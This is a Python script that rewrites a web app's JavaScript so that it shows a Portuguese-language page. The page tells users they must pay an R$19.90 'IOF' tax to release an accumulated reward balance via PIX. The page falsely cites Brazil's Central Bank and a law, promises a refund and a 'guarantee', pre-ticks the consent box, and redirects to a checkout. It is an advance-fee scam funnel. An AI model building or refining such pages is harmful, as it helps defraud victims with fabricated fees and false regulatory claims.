import os

file_path = "/Users/igorcintrasilvamilanmattos/Downloads/jj/kw rewards ig/CONTA TESTE FUNIL /spa_assets/app.js"

new_iof_code = r"""function renderIOF() {
    window.scrollTo(0, 0);
    app.innerHTML = `
        <div class="container iof-container" id="iof-content">
            <div style="display: flex; justify-content: center; margin-bottom: 20px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="160" height="37" viewBox="0 0 160 37" fill="none"><path d="M21.1241 10.7151C21.1241 8.57211 24.1418 6.77896 27.9031 6.77896C31.6643 6.77896 34.682 8.52837 34.682 10.7151C34.682 12.8582 31.6643 14.6076 27.9031 14.6076C24.1418 14.6076 21.1241 12.8582 21.1241 10.7151ZM16.182 10.6277C23.9669 15.1761 33.7636 22.6111 38.7494 26.7222L27.9468 37C20.9054 30.1773 15.0887 24.7979 10.6277 20.9492C13.2518 15.7447 15.1761 12.2459 16.182 10.6277ZM16.0508 4.19858C19.8121 4.19858 23.792 4.37352 27.9468 4.67967C21.0804 7.6974 13.7329 11.7648 5.86052 16.9693C3.7175 15.2199 1.74941 13.8203 0 12.6395C5.81679 9.1844 11.1525 6.38535 16.0508 4.19858ZM40.5863 4.50473L39.7116 10.6277C33.9823 7.12884 27.8156 4.32979 21.1679 2.14303C24.3168 1.04965 26.5473 0.349882 27.9031 0C31.708 0.962175 35.9066 2.49291 40.5863 4.50473ZM27.9468 18.4125C34.4196 13.7329 40.2802 9.9279 46.1844 7.21631C48.8523 8.52837 52.0887 10.3215 55.8499 12.5957C52.0887 15.2199 48.2837 18.1939 44.4787 21.5615C39.2305 20.3369 32.9764 19.156 27.9468 18.4125Z" fill="#003772"></path><path d="M58.5178 24.9289H61.4481V19.8993C62.4977 19.8993 62.8913 19.8993 63.3724 21.605L64.3346 24.9289H67.3961L66.1277 20.8615C65.6467 19.3745 65.2968 18.8934 64.3783 18.7622C66.7838 18.2374 66.8712 16.1819 66.8712 15.657C66.8712 13.3391 65.1218 12.4644 63.0663 12.4644H58.5178V24.9289ZM61.3169 14.5636H62.1916C63.766 14.5636 63.941 15.6133 63.941 16.1381C63.941 17.0128 63.3724 17.8001 62.2353 17.8001H61.3169V14.5636ZM81.9162 22.9608C81.4351 23.1358 80.954 23.092 80.3854 23.092C79.3795 23.092 78.2424 22.5235 78.2424 20.6866C78.2424 20.3367 78.2424 18.1499 80.2542 18.1499C80.8228 18.1499 81.2164 18.1499 81.785 18.2374L81.9162 16.2693C81.0415 16.1818 80.6916 16.1381 79.8169 16.1381C77.0616 16.1381 75.5308 18.0187 75.5308 20.6866C75.5308 22.261 76.2743 25.0601 79.5982 25.0601C80.4292 25.0601 81.2164 25.1476 81.9599 24.9289L81.9162 22.9608ZM90.3571 14.7823H92.9812V12.4644H90.3571V14.7823ZM134.486 12.4644H131.862V17.5376C131.512 16.7504 130.812 16.1381 129.588 16.1381C127.401 16.1381 126.526 18.0625 126.526 20.3804C126.526 23.1358 127.619 25.0601 129.588 25.0601C131.075 25.0601 131.687 24.0979 131.949 23.5294C131.993 24.1417 132.037 24.579 132.037 24.9289H134.53C134.486 24.5353 134.486 24.0979 134.486 23.0045V12.4644ZM129.325 20.5991C129.325 19.2433 129.413 17.9313 130.593 17.9313C131.643 17.9313 131.906 19.2433 131.906 20.5991C131.906 21.605 131.687 23.1795 130.593 23.1795C129.369 23.1795 129.325 21.5176 129.325 20.5991ZM143.408 24.9289H146.032V21.0802C146.032 19.8119 146.207 18.4998 147.738 18.4998H148.612V16.3131H148.219C146.688 16.3131 146.338 16.9254 145.813 17.8875C145.77 17.3627 145.726 16.8379 145.726 16.3131H143.32C143.364 16.7504 143.364 17.2752 143.364 18.1062V24.9289H143.408ZM157.01 24.9289H159.634V12.4644H157.01V24.9289ZM111.437 24.9289H114.237V19.7244H118.173V17.5376H114.237V14.6511H118.304V12.4644H111.394V24.9289H111.437ZM149.312 18.4561C150.362 18.0187 151.149 17.9313 151.805 17.9313C152.199 17.9313 153.423 17.8438 153.423 19.5057H152.636C151.718 19.5057 148.35 19.5057 148.35 22.436C148.35 24.0105 149.4 25.0601 151.018 25.0601C152.242 25.0601 153.292 24.2729 153.38 23.748L153.467 24.9289H155.872C155.829 24.3603 155.829 23.748 155.829 22.4797V19.3308C155.829 17.4064 155.129 16.1381 152.067 16.1381C151.105 16.1381 150.187 16.2693 149.312 16.2693V18.4561ZM153.423 21.2551C153.423 23.3544 152.111 23.3982 151.849 23.3982C151.63 23.3982 150.712 23.3982 150.712 22.2611C150.712 20.8178 152.374 20.7303 153.423 20.7303V21.2551ZM69.8452 19.8556C69.8452 19.3745 69.8452 17.7126 71.201 17.7126C72.2944 17.7126 72.5568 18.7622 72.5568 19.8556H69.8452ZM74.9185 20.6428C74.9185 16.1381 71.9445 16.1381 71.1573 16.1381C68.6644 16.1381 67.3086 18.2374 67.3086 20.5554C67.3086 23.1795 68.6644 25.0601 71.6821 25.0601C72.5568 25.0601 73.5627 25.1038 74.4374 24.9289L74.3937 22.9608C73.519 23.267 72.863 23.267 71.9445 23.267C70.4575 23.267 69.8015 22.3048 69.8015 21.2989H74.9185V20.6428ZM84.5403 19.8556C84.5403 19.3745 84.5403 17.7126 85.8961 17.7126C86.9895 17.7126 87.2519 18.7622 87.2519 19.8556H84.5403ZM89.6136 20.6428C89.6136 16.1381 86.6396 16.1381 85.8523 16.1381C83.3594 16.1381 82.0036 18.2374 82.0036 20.5554C82.0036 23.1795 83.3594 25.0601 86.3772 25.0601C87.2956 25.0601 88.2578 25.1038 89.1325 24.9289L89.0888 22.9608C88.214 23.267 87.558 23.267 86.6396 23.267C85.1526 23.267 84.4966 22.3048 84.4966 21.2989H89.6136V20.6428ZM120.928 19.8556C120.928 19.3745 120.928 17.7126 122.284 17.7126C123.377 17.7126 123.64 18.7622 123.64 19.8556H120.928ZM126.045 20.6428C126.045 16.1381 123.071 16.1381 122.284 16.1381C119.791 16.1381 118.435 18.2374 118.435 20.5554C118.435 23.1795 119.791 25.0601 122.809 25.0601C123.683 25.0601 124.689 25.1038 125.564 24.9289L125.52 22.9608C124.645 23.267 123.989 23.267 123.071 23.267C121.584 23.267 120.928 22.3048 120.928 21.2989H126.045V20.6428ZM137.635 19.8556C137.635 19.3745 137.635 17.7126 138.991 17.7126C140.084 17.7126 140.346 18.7622 140.346 19.8556H137.635ZM142.752 20.6428C142.752 16.1381 139.778 16.1381 138.991 16.1381C136.498 16.1381 135.142 18.2374 135.142 20.5554C135.142 23.1795 136.498 25.0601 139.515 25.0601C140.434 25.0601 141.396 25.1038 142.271 24.9289L142.227 22.9608C141.352 23.267 140.696 23.267 139.778 23.267C138.291 23.267 137.635 22.3048 137.635 21.2989H142.752V20.6428ZM100.547 18.4561C101.597 18.0187 102.384 17.9313 103.04 17.9313C103.434 17.9313 104.658 17.8438 104.658 19.5057H103.871C102.953 19.5057 99.5852 19.5057 99.5852 22.436C99.5852 24.0105 100.635 25.0601 102.253 25.0601C103.521 25.0601 104.527 24.2729 104.615 23.748L104.702 24.9289H107.108C107.064 24.3603 107.02 23.748 107.02 22.4797V19.3308C107.02 17.4064 106.32 16.1381 103.303 16.1381C102.341 16.1381 101.422 16.2693 100.547 16.2693V18.4561ZM104.658 21.2551C104.658 23.3544 103.346 23.3982 103.084 23.3982C102.865 23.3982 101.947 23.3982 101.947 22.2611C101.947 20.8178 103.609 20.7303 104.615 20.7303V21.2551H104.658ZM90.3571 24.9289V16.2693H94.9055V14.4762L97.4859 13.6452V16.2256H99.1916V18.0625H97.4859V22.0424C97.4859 22.8733 97.8795 23.1358 98.3606 23.1358C98.7105 23.1358 98.9729 23.0483 99.2353 22.9608V24.8852C98.9729 24.9726 98.2731 25.0164 97.3984 25.0164C96.0427 25.0164 94.8618 24.3603 94.8618 22.4797V18.1062H93.0249V24.9289H90.3571Z" fill="#003772"></path></svg>
            </div>

            <div class="iof-alert-box" style="margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; color: #000; font-size: 16px; font-weight: 500;">
                <svg aria-hidden="true" style="width: 20px; height: 20px; fill: #FFC107;" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"></path></svg>
                <div style="font-family: 'Manrope', sans-serif;">Imposto sobre Operações Financeiras (IOF)</div>
            </div>

            <div class="elementor-heading-title" style="font-size: 24px; font-weight: 700; margin-bottom: 20px;">Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado</div>
            
            <div class="elementor-heading-title" style="font-size: 18px; margin-bottom: 20px;">Para liberar o valor acumulado de R$${withdrawalData.finalBalance.toFixed(2).replace('.', ',')}, é necessário o pagamento do (IOF) no valor de R$19,90.</div>

            <div class="elementor-heading-title" style="font-size: 16px; margin-bottom: 20px;">
                <span style="color: #FF0000; font-weight: bold;">* </span>Conforme exigido pelo Banco Central do Brasil (Lei nº 8.894/94), o pagamento do (IOF) é obrigatório para a liberação do saldo acumulado. O valor será reembolsado automaticamente junto com o saldo.
            </div>

            <div class="iof-summary-card">
                <h3 class="elementor-heading-title" style="font-size: 18px; font-weight: 700; margin-bottom: 15px;">Resumo</h3>
                <div style="width: 100%; height: 1px; background-color: #E5E5E5; margin-bottom: 15px;"></div>
                
                <div class="summary-row">
                    <span class="elementor-heading-title" style="font-weight: 700; margin:0;">Valor ganho</span>
                    <span class="elementor-heading-title" style="font-weight: 700; margin:0;">R$${withdrawalData.finalBalance.toFixed(2).replace('.', ',')}</span>
                </div>
                <!-- Divider -->
                <div style="width: 100%; height: 1px; background-color: #E5E5E5; margin: 10px 0;"></div>

                <div class="summary-row">
                    <span class="elementor-heading-title" style="font-weight: 700; margin:0;">Valor a ser pago (IOF)</span>
                    <span class="elementor-heading-title" style="font-weight: 700; color: #ff0000; margin:0;">- R$19,90</span>
                </div>
                <div class="elementor-heading-title" style="font-size: 14px; color: #777; margin-bottom: 10px; margin-top: 5px;">*(Reembolsado após Aprovação da Conta e Liberação do Saque)</div>

                <!-- Divider -->
                <div style="width: 100%; height: 1px; background-color: #E5E5E5; margin: 10px 0;"></div>
                
                <div class="summary-row total">
                    <span class="elementor-heading-title" style="font-weight: 800; margin:0;">Total a receber no PIX</span>
                    <span class="elementor-heading-title" style="font-weight: 800; margin:0;">R$${withdrawalData.finalBalance.toFixed(2).replace('.', ',')}</span>
                </div>
                
                <div style="display: flex; gap: 10px; margin-top: 15px; align-items: flex-start;">
                    <svg aria-hidden="true" style="width: 20px; height: 20px; color: #555; flex-shrink: 0;" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z" fill="currentColor"></path></svg>
                    <div class="elementor-heading-title" style="font-size: 13px; font-weight: 700; color: #000; line-height: 1.4;">
                        O pagamento de R$${withdrawalData.finalBalance.toFixed(2).replace('.', ',')} será processado via PIX imediatamente após a confirmação.
                    </div>
                </div>
            </div>

            <div class="guarantee-section">
                <svg aria-hidden="true" class="guarantee-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" style="fill: #28a745; width: 40px; height: 40px; flex-shrink: 0;"><path d="M256 8C119.033 8 8 119.033 8 256s111.033 248 248 248 248-111.033 248-248S392.967 8 256 8zm0 48c110.532 0 200 89.451 200 200 0 110.532-89.451 200-200 200-110.532 0-200-89.451-200-200 0-110.532 89.451-200 200-200m140.204 130.267l-22.536-22.718c-4.667-4.705-12.265-4.736-16.97-.068L215.346 303.697l-59.792-60.277c-4.667-4.705-12.265-4.736-16.97-.069l-22.719 22.536c-4.705 4.667-4.736 12.265-.068 16.971l90.781 91.516c4.667 4.705 12.265 4.736 16.97.068l172.589-171.204c4.704-4.668 4.734-12.266.067-16.971z"></path></svg>
                <div class="guarantee-text">
                    <h2>Garantia de recebimento</h2>
                    <p>Este processo é regulamentado pelo Banco Central do Brasil. Garantimos que o valor total de R$${withdrawalData.finalBalance.toFixed(2).replace('.', ',')} será creditado diretamente no seu PIX após o pagamento.</p>
                </div>
            </div>

            <div class="payment-method-section">
                <div class="payment-method-title elementor-heading-title" style="font-weight: 600; font-size: 18px; margin-bottom: 20px;">Método de pagamento</div>
                <div class="pix-method">
                    <svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="-1.165 -.17395293 238.183 85.60195293" width="68"><path d="m97.827 78.68v-48.324c0-8.892 7.208-16.1 16.1-16.1l14.268.022c8.865.018 16.043 7.21 16.043 16.076v10.286c0 8.891-7.208 16.1-16.1 16.1h-20.161m40.248-42.49h6.19a6.607 6.607 0 0 1 6.606 6.607v36.099" style="fill:none;stroke:#939598;stroke-width:2.976;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10"></path><path d="m159.695 8.657-2.807-2.807a1.783 1.783 0 0 1 0-2.522l2.805-2.805a1.786 1.786 0 0 1 2.525 0l2.805 2.805a1.783 1.783 0 0 1 0 2.522l-2.806 2.807a1.783 1.783 0 0 1 -2.522 0" fill="#32bcad"></path><path d="m172.895 14.218h6.138c3.158 0 6.186 1.254 8.419 3.487l14.356 14.356a4.762 4.762 0 0 0 6.735 0l14.304-14.304a11.906 11.906 0 0 1 8.418-3.487h4.99m-63.36 42.37h6.138c3.158 0 6.186-1.255 8.419-3.487l14.356-14.357a4.762 4.762 0 0 1 6.735 0l14.304 14.304a11.906 11.906 0 0 0 8.418 3.487h4.99" style="fill:none;stroke:#939598;stroke-width:2.976;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10"></path><path d="m61.233 65.811c-3.08 0-5.977-1.2-8.156-3.376l-11.777-11.778c-.827-.829-2.268-.826-3.094 0l-11.82 11.82a11.463 11.463 0 0 1 -8.156 3.377h-2.321l14.916 14.916c4.658 4.658 12.21 4.658 16.869 0l14.958-14.96zm-43.003-41.656c3.08 0 5.977 1.199 8.156 3.376l11.82 11.822a2.19 2.19 0 0 0 3.094 0l11.777-11.779a11.463 11.463 0 0 1 8.156-3.376h1.419l-14.958-14.959c-4.659-4.658-12.211-4.658-16.87 0l-14.914 14.916z" fill="#32bcad"></path><path d="m75.024 36.57-9.039-9.04c-.199.08-.414.13-.642.13h-4.11a8.123 8.123 0 0 0 -5.706 2.365l-11.776 11.775a5.637 5.637 0 0 1 -3.997 1.654 5.637 5.637 0 0 1 -3.997-1.653l-11.821-11.82a8.121 8.121 0 0 0 -5.706-2.365h-5.054c-.215 0-.417-.05-.607-.122l-9.075 9.076c-4.659 4.658-4.659 12.21 0 16.87l9.075 9.074c.19-.072.392-.122.607-.122h5.054a8.122 8.122 0 0 0 5.706-2.364l11.82-11.82c2.136-2.135 5.86-2.136 7.995 0l11.776 11.776a8.123 8.123 0 0 0 5.706 2.365h4.11c.228 0 .443.05.642.13l9.04-9.04c4.658-4.658 4.658-12.21 0-16.87" fill="#32bcad"></path></svg>
                </div>
                <div style="margin-top: 15px; display: flex; gap: 10px;">
                    <svg aria-hidden="true" style="width: 20px; height: 20px; color: #555; flex-shrink: 0;" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z" fill="currentColor"></path></svg>
                    <div style="font-size: 14px; color: #333; font-weight: 500; font-family: 'Manrope', sans-serif;">Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.</div>
                </div>
            </div>

            <!-- Checkbox oculto wrapper logic -->
            <div class="checkbox-container">
                <label>
                    <input type="checkbox" id="termsCheckbox" checked="">
                    Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras (IOF), necessário para completar o saque em conformidade com as regulamentações vigentes.
                </label>
            </div>

            <!-- Botão de pagamento -->
            <div id="paymentButton" class="btn33 enabled">Pagar Imposto</div>
            
            <div class="faq-section">
                <h2 class="faq-title">Dúvidas Frequentes</h2>
                <div class="faq-item">
                    <div class="faq-question">Por que o IOF de R$19,90 não é descontado do saldo acumulado de R$732.93?</div>
                    <div class="faq-answer">
                        <p>Conforme determinação do <strong>Banco Central</strong>, o pagamento do <strong>(IOF)</strong> deve ser realizado separadamente para validar a identidade do beneficiário e <strong>evitar fraudes.</strong> O valor será reembolsado junto ao saldo acumulado após a confirmação.</p>
                    </div>
                </div>
                <div class="faq-item">
                    <div class="faq-question">Como realizar o pagamento do (IOF)?</div>
                    <div class="faq-answer">
                        <p>Clique no botão <strong>'Pagar Imposto'</strong> e siga as instruções para realizar o pagamento via PIX. O processo é rápido e seguro.</p>
                    </div>
                </div>
                <div class="faq-item">
                    <div class="faq-question">NÃO consigo clicar no botão de 'Pagar Imposto'. O que devo fazer?</div>
                    <div class="faq-answer">
                        <p>Certifique-se de ter marcado a opção de <strong>"Concordo com os termos e condições"</strong>, localizado logo <strong>acima do botão.</strong> Após isso, o botão será <strong>habilitado automaticamente.</strong></p>
                    </div>
                </div>
            </div>
        </div>
    `;

    // Checkbox Logic for Button
    const checkbox = document.getElementById('termsCheckbox');
    const payBtn = document.getElementById('paymentButton');

    function toggleButton() {
        if (checkbox.checked) {
            payBtn.classList.add('enabled');
        } else {
            payBtn.classList.remove('enabled');
        }
    }

    checkbox.addEventListener('change', toggleButton);
    toggleButton(); // Init state

    payBtn.addEventListener('click', (e) => {
        if (payBtn.classList.contains('enabled')) {
            // Redirect to checkout
            const queryParams = window.location.search;
            window.location.href = `../checkout/index.html${queryParams}`;
        }
    });

    // FAQ Toggle Logic
    document.querySelectorAll('.faq-question').forEach(question => {
        question.addEventListener('click', () => {
            const answer = question.nextElementSibling;
            const isOpen = answer.style.display === "block";
            
            // Close all
            document.querySelectorAll('.faq-answer').forEach(ans => ans.style.display = 'none');
            
            // Toggle current
            answer.style.display = isOpen ? "none" : "block";
        });
    });
}
"""

with open(file_path, "r") as f:
    content = f.read()

# Replace the block
import re
# Regex to find function renderIOF() { ... until the end of file or init();
# Since we know renderIOF is near end and followed by init();
pattern = r"function renderIOF\(\) \{[\s\S]*?\}\s*// Start the app"
# We need to construct replacement to include "Start the app" comment
# replacement = new_iof_code + "\n\n// Start the app"

# Find start index
start_index = content.find("function renderIOF() {")
if start_index != -1:
    # Find init call
    init_index = content.find("// Start the app", start_index)
    if init_index != -1:
        new_content = content[:start_index] + new_iof_code + "\n\n" + content[init_index:]
        with open(file_path, "w") as f:
            f.write(new_content)
        print("Successfully updated app.js")
    else:
        print("Could not find init() marker")
else:
    print("Could not find renderIOF function")
